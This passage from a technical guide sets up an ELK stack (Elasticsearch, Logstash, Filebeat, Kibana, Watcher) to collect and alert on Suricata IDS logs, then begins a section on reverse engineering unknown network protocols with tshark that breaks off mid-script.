# /etc/elasticsearch/jvm.options.d/heap.options
# Set heap size to 50% of RAM (max 32GB)
-Xms4g
-Xmx4g
```

**Start and Enable Elasticsearch**

```bash
sudo systemctl daemon-reload
sudo systemctl enable elasticsearch
sudo systemctl start elasticsearch

# Verify installation
curl -X GET "localhost:9200/?pretty"

# Set password for elastic user
sudo /usr/share/elasticsearch/bin/elasticsearch-reset-password -u elastic
```

### Index Template for IDS Logs

**Create Elasticsearch Index Template**

```bash
# Create template for Suricata logs
curl -X PUT "localhost:9200/_index_template/suricata-logs" \
  -H 'Content-Type: application/json' \
  -u elastic:$ELASTIC_PASSWORD \
  -d '{
  "index_patterns": ["suricata-*"],
  "template": {
    "settings": {
      "number_of_shards": 2,
      "number_of_replicas": 1,
      "index.refresh_interval": "5s",
      "index.codec": "best_compression"
    },
    "mappings": {
      "properties": {
        "@timestamp": {"type": "date"},
        "timestamp": {"type": "date"},
        "event_type": {"type": "keyword"},
        "src_ip": {"type": "ip"},
        "dest_ip": {"type": "ip"},
        "src_port": {"type": "integer"},
        "dest_port": {"type": "integer"},
        "proto": {"type": "keyword"},
        "flow_id": {"type": "long"},
        "alert": {
          "properties": {
            "signature": {"type": "text", "fields": {"keyword": {"type": "keyword"}}},
            "signature_id": {"type": "integer"},
            "category": {"type": "keyword"},
            "severity": {"type": "integer"},
            "action": {"type": "keyword"}
          }
        },
        "http": {
          "properties": {
            "hostname": {"type": "keyword"},
            "url": {"type": "text"},
            "http_user_agent": {"type": "text", "fields": {"keyword": {"type": "keyword"}}},
            "http_method": {"type": "keyword"},
            "status": {"type": "integer"}
          }
        },
        "dns": {
          "properties": {
            "query": {"type": "keyword"},
            "query_type": {"type": "keyword"},
            "response": {"type": "keyword"}
          }
        },
        "tls": {
          "properties": {
            "subject": {"type": "keyword"},
            "issuerdn": {"type": "keyword"},
            "fingerprint": {"type": "keyword"}
          }
        },
        "geo_src": {
          "properties": {
            "country_name": {"type": "keyword"},
            "city_name": {"type": "keyword"},
            "location": {"type": "geo_point"}
          }
        },
        "geo_dest": {
          "properties": {
            "country_name": {"type": "keyword"},
            "city_name": {"type": "keyword"},
            "location": {"type": "geo_point"}
          }
        }
      }
    }
  },
  "priority": 500,
  "version": 1
}'
```

### Logstash Configuration

**Install Logstash**

```bash
sudo apt install logstash

# Enable and start
sudo systemctl enable logstash
sudo systemctl start logstash
```

**Logstash Pipeline Configuration**

```ruby
# /etc/logstash/conf.d/suricata.conf

input {
  file {
    path => "/var/log/suricata/eve.json"
    start_position => "beginning"
    sincedb_path => "/var/lib/logstash/suricata_sincedb"
    codec => json
    type => "suricata"
  }
}

filter {
  if [type] == "suricata" {
    
    # Parse timestamp
    date {
      match => [ "timestamp", "ISO8601" ]
      target => "@timestamp"
    }
    
    # GeoIP enrichment for source IP
    if [src_ip] {
      geoip {
        source => "src_ip"
        target => "geo_src"
        fields => ["country_name", "city_name", "location", "latitude", "longitude"]
      }
    }
    
    # GeoIP enrichment for destination IP
    if [dest_ip] {
      geoip {
        source => "dest_ip"
        target => "geo_dest"
        fields => ["country_name", "city_name", "location", "latitude", "longitude"]
      }
    }
    
    # Extract domain from HTTP hostname
    if [http][hostname] {
      ruby {
        code => '
          hostname = event.get("[http][hostname]")
          if hostname
            parts = hostname.split(".")
            if parts.length >= 2
              domain = parts[-2..-1].join(".")
              event.set("[http][domain]", domain)
            end
          end
        '
      }
    }
    
    # Threat intelligence enrichment
    # [Inference: Requires threat intelligence feed integration]
    if [dest_ip] {
      translate {
        field => "dest_ip"
        destination => "threat_intel"
        dictionary_path => "/etc/logstash/threat_intel.yml"
        fallback => "clean"
      }
    }
    
    # Add classification tags
    if [alert][severity] {
      if [alert][severity] <= 2 {
        mutate {
          add_tag => ["high_severity"]
        }
      } else if [alert][severity] == 3 {
        mutate {
          add_tag => ["medium_severity"]
        }
      }
    }
    
    # Tag specific attack types
    if [alert][signature] {
      if [alert][signature] =~ /SQL|injection/i {
        mutate {
          add_tag => ["sql_injection"]
        }
      } else if [alert][signature] =~ /XSS|cross.site/i {
        mutate {
          add_tag => ["xss"]
        }
      } else if [alert][signature] =~ /scan|recon/i {
        mutate {
          add_tag => ["reconnaissance"]
        }
      }
    }
    
    # Calculate flow duration for completed flows
    if [flow][start] and [flow][end] {
      ruby {
        code => '
          start_time = event.get("[flow][start]")
          end_time = event.get("[flow][end]")
          if start_time and end_time
            duration = end_time - start_time
            event.set("[flow][duration]", duration)
          end
        '
      }
    }
  }
}

output {
  if [type] == "suricata" {
    elasticsearch {
      hosts => ["localhost:9200"]
      index => "suricata-%{+YYYY.MM.dd}"
      user => "elastic"
      password => "${ELASTIC_PASSWORD}"
    }
    
    # Debug output (optional)
    # stdout { codec => rubydebug }
  }
}
```

**Threat Intelligence Dictionary**

```yaml
# /etc/logstash/threat_intel.yml
"192.0.2.100": "known_c2_server"
"198.51.100.50": "malware_distribution"
"203.0.113.75": "phishing_infrastructure"
```

**Test Logstash Configuration**

```bash
# Validate configuration syntax
sudo -u logstash /usr/share/logstash/bin/logstash \
  --path.settings /etc/logstash \
  -t -f /etc/logstash/conf.d/suricata.conf

# Run in foreground for debugging
sudo -u logstash /usr/share/logstash/bin/logstash \
  --path.settings /etc/logstash \
  -f /etc/logstash/conf.d/suricata.conf
```

### Filebeat Alternative (Lightweight Shipper)

**Install and Configure Filebeat**

```bash
sudo apt install filebeat

# Enable Suricata module
sudo filebeat modules enable suricata

# Configure module
sudo vi /etc/filebeat/modules.d/suricata.yml
```

**Suricata Module Configuration**

```yaml
# /etc/filebeat/modules.d/suricata.yml

- module: suricata
  eve:
    enabled: true
    var.paths: ["/var/log/suricata/eve.json"]
    var.tags: ["suricata", "ids"]
```

**Filebeat Main Configuration**

```yaml
# /etc/filebeat/filebeat.yml

filebeat.config.modules:
  path: ${path.config}/modules.d/*.yml
  reload.enabled: false

# Elasticsearch output
output.elasticsearch:
  hosts: ["localhost:9200"]
  username: "elastic"
  password: "${ELASTIC_PASSWORD}"
  index: "filebeat-%{[agent.version]}-%{+yyyy.MM.dd}"

# Kibana endpoint
setup.kibana:
  host: "localhost:5601"

# Processors for enrichment
processors:
  - add_host_metadata:
      when.not.contains.tags: forwarded
  - add_cloud_metadata: ~
  - add_docker_metadata: ~
  - add_kubernetes_metadata: ~
  
  # GeoIP enrichment
  - add_locale: ~
  
  # Drop unnecessary fields
  - drop_fields:
      fields: ["agent.ephemeral_id", "agent.id"]
      ignore_missing: true
```

**Setup and Start Filebeat**

```bash
# Load Kibana dashboards
sudo filebeat setup --dashboards

# Load index template
sudo filebeat setup --index-management

# Start Filebeat
sudo systemctl enable filebeat
sudo systemctl start filebeat

# Verify data flow
curl -X GET "localhost:9200/_cat/indices/filebeat-*?v" -u elastic:$ELASTIC_PASSWORD
```

### Kibana Configuration and Visualization

**Install Kibana**

```bash
sudo apt install kibana

# Configure Kibana
sudo vi /etc/kibana/kibana.yml
```

**Kibana Configuration**

```yaml
# /etc/kibana/kibana.yml

server.port: 5601
server.host: "0.0.0.0"
server.name: "security-kibana"

elasticsearch.hosts: ["http://localhost:9200"]
elasticsearch.username: "elastic"
elasticsearch.password: "${ELASTIC_PASSWORD}"

# Enable security features
xpack.security.enabled: true
xpack.encryptedSavedObjects.encryptionKey: "min-32-byte-long-strong-encryption-key-change-this"
```

**Start Kibana**

```bash
sudo systemctl enable kibana
sudo systemctl start kibana

# Access Kibana
# http://localhost:5601
```

**Create Index Pattern**

```bash
# Via Kibana UI:
# Stack Management → Index Patterns → Create Index Pattern
# Pattern: suricata-*
# Time field: @timestamp

# Via API:
curl -X POST "localhost:5601/api/saved_objects/index-pattern/suricata-*" \
  -H 'kbn-xsrf: true' \
  -H 'Content-Type: application/json' \
  -u elastic:$ELASTIC_PASSWORD \
  -d '{
  "attributes": {
    "title": "suricata-*",
    "timeFieldName": "@timestamp"
  }
}'
```

### Custom Kibana Dashboards

**Dashboard via API (JSON)**

```json
{
  "attributes": {
    "title": "IDS Alert Overview",
    "hits": 0,
    "description": "Overview of IDS alerts and network activity",
    "panelsJSON": "[{\"version\":\"8.0.0\",\"gridData\":{\"x\":0,\"y\":0,\"w\":24,\"h\":15,\"i\":\"1\"},\"panelIndex\":\"1\",\"embeddableConfig\":{},\"panelRefName\":\"panel_1\"}]",
    "optionsJSON": "{\"hidePanelTitles\":false,\"useMargins\":true}",
    "version": 1,
    "timeRestore": true,
    "timeTo": "now",
    "timeFrom": "now-24h",
    "refreshInterval": {
      "pause": false,
      "value": 30000
    },
    "kibanaSavedObjectMeta": {
      "searchSourceJSON": "{\"query\":{\"language\":\"kuery\",\"query\":\"\"},\"filter\":[]}"
    }
  }
}
```

**Visualization Examples**

Alert Timeline Visualization:

```json
{
  "title": "Alerts Over Time",
  "visState": {
    "type": "histogram",
    "params": {
      "type": "histogram",
      "grid": {"categoryLines": false},
      "categoryAxes": [{
        "id": "CategoryAxis-1",
        "type": "category",
        "position": "bottom",
        "show": true,
        "title": {}
      }],
      "valueAxes": [{
        "id": "ValueAxis-1",
        "name": "LeftAxis-1",
        "type": "value",
        "position": "left",
        "show": true,
        "title": {"text": "Count"}
      }],
      "seriesParams": [{
        "show": true,
        "type": "histogram",
        "mode": "stacked",
        "data": {
          "label": "Count",
          "id": "1"
        },
        "valueAxis": "ValueAxis-1"
      }]
    },
    "aggs": [
      {
        "id": "1",
        "enabled": true,
        "type": "count",
        "schema": "metric",
        "params": {}
      },
      {
        "id": "2",
        "enabled": true,
        "type": "date_histogram",
        "schema": "segment",
        "params": {
          "field": "@timestamp",
          "interval": "auto",
          "min_doc_count": 1
        }
      },
      {
        "id": "3",
        "enabled": true,
        "type": "terms",
        "schema": "group",
        "params": {
          "field": "alert.severity",
          "orderBy": "1",
          "order": "desc",
          "size": 5
        }
      }
    ]
  }
}
```

**Top Source IPs Visualization:**

```json
{
  "title": "Top 10 Alert Source IPs",
  "visState": {
    "type": "pie",
    "params": {
      "type": "pie",
      "addTooltip": true,
      "addLegend": true,
      "legendPosition": "right",
      "isDonut": true,
      "labels": {
        "show": true,
        "values": true,
        "last_level": true,
        "truncate": 100
      }
    },
    "aggs": [
      {
        "id": "1",
        "enabled": true,
        "type": "count",
        "schema": "metric",
        "params": {}
      },
      {
        "id": "2",
        "enabled": true,
        "type": "terms",
        "schema": "segment",
        "params": {
          "field": "src_ip",
          "orderBy": "1",
          "order": "desc",
          "size": 10,
          "otherBucket": false,
          "otherBucketLabel": "Other",
          "missingBucket": false,
          "missingBucketLabel": "Missing"
        }
      }
    ]
  },
  "uiStateJSON": "{}",
  "description": "",
  "savedSearchRefName": "search_0",
  "kibanaSavedObjectMeta": {
    "searchSourceJSON": "{\"query\":{\"query\":\"event_type:alert\",\"language\":\"kuery\"},\"filter\":[]}"
  }
}
```

**Geographic Map Visualization:**

```json
{
  "title": "Alert Source Locations",
  "visState": {
    "type": "vega",
    "params": {
      "spec": {
        "$schema": "https://vega.github.io/schema/vega-lite/v5.json",
        "data": {
          "url": {
            "index": "suricata-*",
            "body": {
              "aggs": {
                "locations": {
                  "terms": {
                    "field": "geo_src.country_name",
                    "size": 100
                  },
                  "aggs": {
                    "centroid": {
                      "geo_centroid": {
                        "field": "geo_src.location"
                      }
                    }
                  }
                }
              },
              "size": 0
            }
          },
          "format": {"property": "aggregations.locations.buckets"}
        },
        "projection": {"type": "mercator"},
        "mark": "circle",
        "encoding": {
          "longitude": {"field": "centroid.location.lon", "type": "quantitative"},
          "latitude": {"field": "centroid.location.lat", "type": "quantitative"},
          "size": {"field": "doc_count", "type": "quantitative", "scale": {"range": [100, 2000]}},
          "color": {"value": "red"},
          "tooltip": [
            {"field": "key", "type": "nominal", "title": "Country"},
            {"field": "doc_count", "type": "quantitative", "title": "Alert Count"}
          ]
        }
      }
    },
    "aggs": []
  }
}
```

### Advanced Elasticsearch Queries

**Search for High-Severity Alerts**

```bash
# Query via API
curl -X GET "localhost:9200/suricata-*/_search?pretty" \
  -H 'Content-Type: application/json' \
  -u elastic:$ELASTIC_PASSWORD \
  -d '{
  "query": {
    "bool": {
      "must": [
        {"term": {"event_type": "alert"}},
        {"range": {"alert.severity": {"lte": 2}}}
      ]
    }
  },
  "sort": [{"@timestamp": {"order": "desc"}}],
  "size": 100
}'

# Using Kibana Dev Tools (KQL syntax):
event_type:alert AND alert.severity:<=2
```

**Aggregation: Top Attack Signatures**

```bash
curl -X GET "localhost:9200/suricata-*/_search?pretty" \
  -H 'Content-Type: application/json' \
  -u elastic:$ELASTIC_PASSWORD \
  -d '{
  "size": 0,
  "query": {
    "bool": {
      "must": [
        {"term": {"event_type": "alert"}},
        {"range": {"@timestamp": {"gte": "now-24h"}}}
      ]
    }
  },
  "aggs": {
    "top_signatures": {
      "terms": {
        "field": "alert.signature.keyword",
        "size": 20,
        "order": {"_count": "desc"}
      },
      "aggs": {
        "severity_breakdown": {
          "terms": {
            "field": "alert.severity"
          }
        }
      }
    }
  }
}'
```

**Time-Based Analysis: Alerts per Hour**

```bash
curl -X GET "localhost:9200/suricata-*/_search?pretty" \
  -H 'Content-Type: application/json' \
  -u elastic:$ELASTIC_PASSWORD \
  -d '{
  "size": 0,
  "query": {
    "term": {"event_type": "alert"}
  },
  "aggs": {
    "alerts_over_time": {
      "date_histogram": {
        "field": "@timestamp",
        "calendar_interval": "hour",
        "min_doc_count": 1
      },
      "aggs": {
        "avg_severity": {
          "avg": {"field": "alert.severity"}
        }
      }
    }
  }
}'
```

**Complex Boolean Query: Multi-Stage Attack Detection**

```bash
curl -X GET "localhost:9200/suricata-*/_search?pretty" \
  -H 'Content-Type: application/json' \
  -u elastic:$ELASTIC_PASSWORD \
  -d '{
  "query": {
    "bool": {
      "must": [
        {"term": {"event_type": "alert"}},
        {"range": {"@timestamp": {"gte": "now-1h"}}}
      ],
      "should": [
        {
          "bool": {
            "must": [
              {"match": {"alert.signature": "scan"}},
              {"match": {"alert.signature": "recon"}}
            ]
          }
        },
        {
          "bool": {
            "must": [
              {"match": {"alert.signature": "exploit"}},
              {"range": {"alert.severity": {"lte": 2}}}
            ]
          }
        }
      ],
      "minimum_should_match": 1,
      "filter": [
        {"terms": {"src_ip": ["192.168.1.100", "192.168.1.101"]}}
      ]
    }
  },
  "sort": [{"@timestamp": {"order": "desc"}}]
}'
```

### Alerting with Elasticsearch Watcher

**Create Watcher for High-Severity Alerts**

```bash
curl -X PUT "localhost:9200/_watcher/watch/high_severity_alerts" \
  -H 'Content-Type: application/json' \
  -u elastic:$ELASTIC_PASSWORD \
  -d '{
  "trigger": {
    "schedule": {
      "interval": "5m"
    }
  },
  "input": {
    "search": {
      "request": {
        "indices": ["suricata-*"],
        "body": {
          "query": {
            "bool": {
              "must": [
                {"term": {"event_type": "alert"}},
                {"range": {"alert.severity": {"lte": 1}}},
                {"range": {"@timestamp": {"gte": "now-5m"}}}
              ]
            }
          }
        }
      }
    }
  },
  "condition": {
    "compare": {
      "ctx.payload.hits.total": {
        "gt": 0
      }
    }
  },
  "actions": {
    "log_action": {
      "logging": {
        "text": "High severity alert detected: {{ctx.payload.hits.total}} alerts in last 5 minutes"
      }
    },
    "email_action": {
      "email": {
        "to": "security-team@example.com",
        "subject": "Critical IDS Alert",
        "body": {
          "html": "<h2>Critical Security Alert</h2><p>{{ctx.payload.hits.total}} high-severity alerts detected.</p><ul>{{#ctx.payload.hits.hits}}<li>{{_source.alert.signature}} from {{_source.src_ip}}</li>{{/ctx.payload.hits.hits}}</ul>"
        }
      }
    },
    "webhook_action": {
      "webhook": {
        "scheme": "https",
        "host": "hooks.slack.com",
        "port": 443,
        "method": "post",
        "path": "/services/YOUR/WEBHOOK/URL",
        "body": "{\"text\": \"Critical IDS Alert: {{ctx.payload.hits.total}} high-severity alerts detected\"}"
      }
    }
  }
}'
```

**Watcher for Anomalous Connection Patterns**

```bash
curl -X PUT "localhost:9200/_watcher/watch/connection_spike" \
  -H 'Content-Type: application/json' \
  -u elastic:$ELASTIC_PASSWORD \
  -d '{
  "trigger": {
    "schedule": {
      "interval": "10m"
    }
  },
  "input": {
    "search": {
      "request": {
        "indices": ["suricata-*"],
        "body": {
          "size": 0,
          "query": {
            "bool": {
              "must": [
                {"term": {"event_type": "flow"}},
                {"range": {"@timestamp": {"gte": "now-10m"}}}
              ]
            }
          },
          "aggs": {
            "by_src": {
              "terms": {
                "field": "src_ip",
                "size": 10
              }
            }
          }
        }
      }
    }
  },
  "condition": {
    "script": {
      "source": "return ctx.payload.aggregations.by_src.buckets.stream().anyMatch(bucket -> bucket.doc_count > 1000);",
      "lang": "painless"
    }
  },
  "actions": {
    "notify": {
      "logging": {
        "text": "Connection spike detected from: {{#ctx.payload.aggregations.by_src.buckets}}{{#script}}ctx.payload.doc_count > 1000{{/script}}{{key}} ({{doc_count}} connections){{/ctx.payload.aggregations.by_src.buckets}}"
      }
    }
  }
}'
```

### Machine Learning with Elasticsearch

**Create Anomaly Detection Job**

```bash
# Create ML job for detecting unusual network traffic patterns
curl -X PUT "localhost:9200/_ml/anomaly_detectors/unusual_network_traffic" \
  -H 'Content-Type: application/json' \
  -u elastic:$ELASTIC_PASSWORD \
  -d '{
  "description": "Detect unusual network traffic volumes",
  "analysis_config": {
    "bucket_span": "15m",
    "detectors": [
      {
        "function": "high_count",
        "partition_field_name": "src_ip"
      },
      {
        "function": "high_mean",
        "field_name": "bytes_out",
        "partition_field_name": "dest_ip"
      },
      {
        "function": "rare",
        "by_field_name": "dest_port"
      }
    ],
    "influencers": ["src_ip", "dest_ip", "dest_port"]
  },
  "data_description": {
    "time_field": "@timestamp",
    "time_format": "epoch_ms"
  },
  "datafeed_config": {
    "indices": ["suricata-*"],
    "query": {
      "bool": {
        "must": [
          {"term": {"event_type": "flow"}}
        ]
      }
    }
  }
}'

# Start the ML job
curl -X POST "localhost:9200/_ml/anomaly_detectors/unusual_network_traffic/_open" \
  -u elastic:$ELASTIC_PASSWORD

# Start the datafeed
curl -X POST "localhost:9200/_ml/datafeeds/datafeed-unusual_network_traffic/_start" \
  -u elastic:$ELASTIC_PASSWORD
```

### Performance Optimization

**Index Lifecycle Management (ILM)**

```bash
# Create ILM policy for Suricata logs
curl -X PUT "localhost:9200/_ilm/policy/suricata_policy" \
  -H 'Content-Type: application/json' \
  -u elastic:$ELASTIC_PASSWORD \
  -d '{
  "policy": {
    "phases": {
      "hot": {
        "min_age": "0ms",
        "actions": {
          "rollover": {
            "max_size": "50gb",
            "max_age": "1d"
          },
          "set_priority": {
            "priority": 100
          }
        }
      },
      "warm": {
        "min_age": "7d",
        "actions": {
          "shrink": {
            "number_of_shards": 1
          },
          "forcemerge": {
            "max_num_segments": 1
          },
          "set_priority": {
            "priority": 50
          }
        }
      },
      "cold": {
        "min_age": "30d",
        "actions": {
          "freeze": {},
          "set_priority": {
            "priority": 0
          }
        }
      },
      "delete": {
        "min_age": "90d",
        "actions": {
          "delete": {}
        }
      }
    }
  }
}'

# Apply policy to index template
curl -X PUT "localhost:9200/_index_template/suricata-logs" \
  -H 'Content-Type: application/json' \
  -u elastic:$ELASTIC_PASSWORD \
  -d '{
  "index_patterns": ["suricata-*"],
  "template": {
    "settings": {
      "index.lifecycle.name": "suricata_policy",
      "index.lifecycle.rollover_alias": "suricata"
    }
  }
}'
```

**Cluster Tuning**

```yaml
# /etc/elasticsearch/elasticsearch.yml - Production settings

# Thread pools
thread_pool.search.queue_size: 1000
thread_pool.write.queue_size: 1000

# Circuit breakers
indices.breaker.total.limit: 70%
indices.breaker.request.limit: 40%
indices.breaker.fielddata.limit: 40%

# Cache settings
indices.queries.cache.size: 10%
indices.fielddata.cache.size: 20%

# Indexing buffer
indices.memory.index_buffer_size: 20%

# Refresh interval for near real-time
index.refresh_interval: 30s

# Bulk processing
bulk.queue.size: 200
```

### Integration Scripts

**Python Script: Automated Alert Response**

```python
#!/usr/bin/env python3
# elastic_alert_response.py - Automated response to IDS alerts

from elasticsearch import Elasticsearch
from datetime import datetime, timedelta
import subprocess
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class ElasticAlertResponder:
    def __init__(self, es_host, username, password):
        self.es = Elasticsearch(
            [es_host],
            basic_auth=(username, password),
            verify_certs=True
        )
    
    def get_recent_alerts(self, minutes=5):
        """Retrieve recent high-severity alerts"""
        query = {
            "query": {
                "bool": {
                    "must": [
                        {"term": {"event_type": "alert"}},
                        {"range": {"alert.severity": {"lte": 2}}},
                        {
                            "range": {
                                "@timestamp": {
                                    "gte": f"now-{minutes}m"
                                }
                            }
                        }
                    ]
                }
            },
            "sort": [{"@timestamp": {"order": "desc"}}],
            "size": 100
        }
        
        result = self.es.search(index="suricata-*", body=query)
        return result['hits']['hits']
    
    def block_ip(self, ip_address):
        """Block malicious IP using iptables"""
        # [Inference: Assumes appropriate permissions and firewall configuration]
        try:
            cmd = ['sudo', 'iptables', '-A', 'INPUT', '-s', ip_address, '-j', 'DROP']
            subprocess.run(cmd, check=True, capture_output=True)
            logger.info(f"Blocked IP: {ip_address}")
            
            # Log action to Elasticsearch
            self.log_action('block_ip', ip_address, 'success')
            
        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to block IP {ip_address}: {e}")
            self.log_action('block_ip', ip_address, 'failure', str(e))
    
    def log_action(self, action_type, target, status, details=''):
        """Log response actions to Elasticsearch"""
        doc = {
            '@timestamp': datetime.utcnow().isoformat(),
            'action_type': action_type,
            'target': target,
            'status': status,
            'details': details,
            'event_type': 'automated_response'
        }
        
        self.es.index(index='security-actions', document=doc)
    
    def analyze_and_respond(self):
        """Main analysis and response loop"""
        alerts = self.get_recent_alerts()
        
        # Group alerts by source IP
        ip_counts = {}
        for alert in alerts:
            src_ip = alert['_source'].get('src_ip')
            if src_ip:
                ip_counts[src_ip] = ip_counts.get(src_ip, 0) + 1
        
        # Block IPs with multiple high-severity alerts
        threshold = 5
        for ip, count in ip_counts.items():
            if count >= threshold:
                logger.warning(f"IP {ip} triggered {count} alerts - initiating block")
                self.block_ip(ip)
        
        logger.info(f"Processed {len(alerts)} alerts, blocked {len([c for c in ip_counts.values() if c >= threshold])} IPs")

if __name__ == '__main__':
    import os
    
    ES_HOST = os.getenv('ES_HOST', 'https://localhost:9200')
    ES_USER = os.getenv('ES_USER', 'elastic')
    ES_PASS = os.getenv('ES_PASS')
    
    responder = ElasticAlertResponder(ES_HOST, ES_USER, ES_PASS)
    responder.analyze_and_respond()
```

**Bash Script: ELK Health Monitoring**

```bash
#!/bin/bash
# elk_health_check.sh - Monitor ELK stack health

ES_HOST="localhost:9200"
ES_USER="elastic"
ES_PASS="${ELASTIC_PASSWORD}"

echo "=== ELK Stack Health Check ==="
echo "Timestamp: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo ""

# Elasticsearch cluster health
echo "Elasticsearch Cluster Health:"
curl -s -u "${ES_USER}:${ES_PASS}" "${ES_HOST}/_cluster/health?pretty" | \
    jq -r '.status, .number_of_nodes, .active_shards'
echo ""

# Index statistics
echo "Index Statistics:"
curl -s -u "${ES_USER}:${ES_PASS}" "${ES_HOST}/_cat/indices/suricata-*?v&s=index:desc&h=index,docs.count,store.size" | head -10
echo ""

# Logstash pipeline status
echo "Logstash Pipeline Status:"
systemctl status logstash | grep -E 'Active:|Main PID:'
echo ""

# Filebeat status
echo "Filebeat Status:"
systemctl status filebeat | grep -E 'Active:|Main PID:'
echo ""

# Kibana status
echo "Kibana Status:"
curl -s "http://localhost:5601/api/status" | jq -r '.status.overall.state'
echo ""

# Check ingestion rate
echo "Recent Ingestion Rate:"
curl -s -u "${ES_USER}:${ES_PASS}" "${ES_HOST}/suricata-*/_search" \
    -H 'Content-Type: application/json' \
    -d '{
  "size": 0,
  "query": {"range": {"@timestamp": {"gte": "now-5m"}}},
  "aggs": {"by_minute": {"date_histogram": {"field": "@timestamp", "calendar_interval": "minute"}}}
}' | jq -r '.aggregations.by_minute.buckets[] | "\(.key_as_string): \(.doc_count) docs"'
```

---

## Important Subtopics

**Snort3 Migration** - Next-generation Snort with improved performance, Lua-based configuration, and enhanced protocol awareness

**Zeek (formerly Bro) Integration** - Complementary network security monitoring platform with scripting capabilities and comprehensive protocol analysis

**SIEM Correlation Rules** - Cross-platform correlation between IDS alerts, firewall logs, and endpoint data for advanced threat detection

**Threat Intelligence Platform Integration** - Automated IOC enrichment from MISP, STIX/TAXII feeds, and commercial threat intelligence sources

---

# Reverse Engineering Network Protocols

## Unknown Protocol Analysis

### Initial Protocol Identification

**Reconnaissance Phase:**

```bash
# Examine protocol hierarchy
tshark -r capture.pcap -q -z io,phs

# Identify unrecognized protocols (shown as "data")
tshark -r capture.pcap -Y "data" -T fields -e frame.number -e frame.len

# Extract raw hex data from unknown protocol
tshark -r capture.pcap -Y "data" -T fields -e data.data -e frame.len

# Get statistics on packet lengths (reveals structure patterns)
tshark -r capture.pcap -T fields -e frame.len | sort -n | uniq -c
```

**Protocol Layer Determination:**

```bash
# Check if custom protocol runs over TCP/UDP
tshark -r capture.pcap -T fields -e tcp.payload -e tcp.srcport -e tcp.dstport | head -20

# Examine UDP-based custom protocols
tshark -r capture.pcap -Y "udp" -T fields -e udp.payload -e udp.port

# Check for Layer 2 custom protocols (Ethernet type)
tshark -r capture.pcap -T fields -e eth.type | sort | uniq -c
```

### Traffic Flow Analysis

**Conversation Mapping:**

```bash
# Identify communication endpoints
tshark -r capture.pcap -q -z conv,tcp
tshark -r capture.pcap -q -z conv,udp

# Extract specific conversation for analysis
tshark -r capture.pcap -Y "tcp.stream eq 0" -T fields -e tcp.payload > stream0.hex

# Analyze bidirectional patterns
tshark -r capture.pcap -Y "tcp.stream eq 0" -T fields -e frame.number -e ip.src -e ip.dst -e frame.len -e tcp.payload
```

**Request-Response Pattern Detection:**

```bash
# Look for alternating packet directions
tshark -r capture.pcap -Y "tcp.stream eq 0" -T fields -e frame.time_relative -e ip.src -e frame.len | awk '{print $1, ($2 == prev_src ? "CONT" : "SWITCH"), $3; prev_src=$2}'

# Time delta analysis (detect timing patterns)
tshark -r capture.pcap -Y "tcp.stream eq 0" -T fields -e frame.time_delta
```

### Entropy Analysis

**Detecting Encryption vs Cleartext:**

```bash
# Extract payload and calculate entropy
tshark -r capture.pcap -Y "tcp.stream eq 0" -T fields -e tcp.payload | xxd -r -p > payload.bin

# Calculate entropy using Python (entropy near 8.0 suggests encryption/compression)
python3 << 'EOF'
import math
from collections import Counter

with open('payload.bin', 'rb') as f:
    data = f.read()
    
if len(data) == 0:
    print("No data")
else:
    counter = Counter(data)
    entropy = 0
    for count in counter.values():
        p = count / len(data)
        entropy -= p * math.log2(p)
    print(f"Entropy: {entropy:.4f} bits/byte")
EOF

# Check byte frequency distribution
xxd -p payload.bin | fold -w2 | sort | uniq -c | sort -rn | head -20
```

**[Inference]** Entropy values:

- 0-3: Highly structured or repetitive (likely cleartext)
- 3-6: Moderately structured (compressed or encoded)
- 7-8: High randomness (encrypted or compressed)

### ASCII vs Binary Determination

```bash
# Check for ASCII printable characters
tshark -r capture.pcap -Y "tcp.stream eq 0" -T fields -e tcp.payload | xxd -r -p | strings -n 4

# Calculate ASCII ratio
tshark -r capture.pcap -Y "tcp.stream eq 0" -T fields -e tcp.payload | xxd -r -p | \
python3 -c "
import sys
data = sys.stdin.buffer.read()
ascii_count = sum(1 for b in data if 32 <= b <= 126 or b in [9, 10, 13])
print(f'ASCII ratio: {ascii_count/len(data)*100:.2f}%' if data else 'No data')
"

# Visualize byte distribution
tshark -r capture.pcap -Y "tcp.stream eq 0" -T fields -e tcp.payload | xxd -r -p | \
hexdump -C | head -100
```

## Pattern Recognition

### Magic Number Identification

**Header Pattern Detection:**

```bash
# Extract first bytes of each packet
tshark -r capture.pcap -Y "tcp.len > 0" -T fields -e tcp.payload | \
while read line; do echo ${line:0:16}; done | sort | uniq -c | sort -rn

# Look for common file signatures/magic numbers
tshark -r capture.pcap -Y "tcp.payload" -T fields -e tcp.payload | \
grep -E "^(504b0304|ffd8ffe0|89504e47|255044462d)" | head

# Check for consistent header structure
tshark -r capture.pcap -Y "tcp.stream eq 0 && tcp.len > 0" -T fields -e tcp.payload | \
awk '{print substr($0,1,8)}' | sort | uniq -c
```

**Footer/Terminator Detection:**

```bash
# Extract last bytes of packets
tshark -r capture.pcap -Y "tcp.len > 0" -T fields -e tcp.payload | \
while read line; do echo ${line: -16}; done | sort | uniq -c | sort -rn

# Look for null terminators or specific end sequences
tshark -r capture.pcap -Y "tcp.payload" -T fields -e tcp.payload | \
grep "0000$" | wc -l
```

### Delimiter and Separator Patterns

**Common Separators:**

```bash
# Search for potential delimiters
tshark -r capture.pcap -Y "tcp.stream eq 0" -T fields -e tcp.payload | xxd -r -p | \
python3 << 'EOF'
import sys
from collections import Counter

data = sys.stdin.buffer.read()
# Check common separators
separators = {
    b'\x00': 'NULL',
    b'\n': 'LF',
    b'\r\n': 'CRLF',
    b'\r': 'CR',
    b'|': 'PIPE',
    b',': 'COMMA',
    b';': 'SEMICOLON',
    b'\x1f': 'US (Unit Separator)',
    b'\x1e': 'RS (Record Separator)'
}

for sep, name in separators.items():
    count = data.count(sep)
    if count > 0:
        print(f"{name}: {count} occurrences")
EOF

# Visualize potential field boundaries
tshark -r capture.pcap -Y "tcp.stream eq 0 && tcp.len > 0" -T fields -e tcp.payload | \
head -5 | xxd -r -p | xxd -g 1
```

### Length Field Detection

**Fixed vs Variable Length Analysis:**

```bash
# Packet length distribution
tshark -r capture.pcap -Y "tcp.stream eq 0" -T fields -e tcp.len | \
sort | uniq -c | sort -rn

# Check if first bytes correlate with packet length
tshark -r capture.pcap -Y "tcp.stream eq 0 && tcp.len > 4" -T fields -e tcp.len -e tcp.payload | \
while read len payload; do
    # Extract first 2 bytes as potential length field
    len_field=$((16#${payload:0:4}))
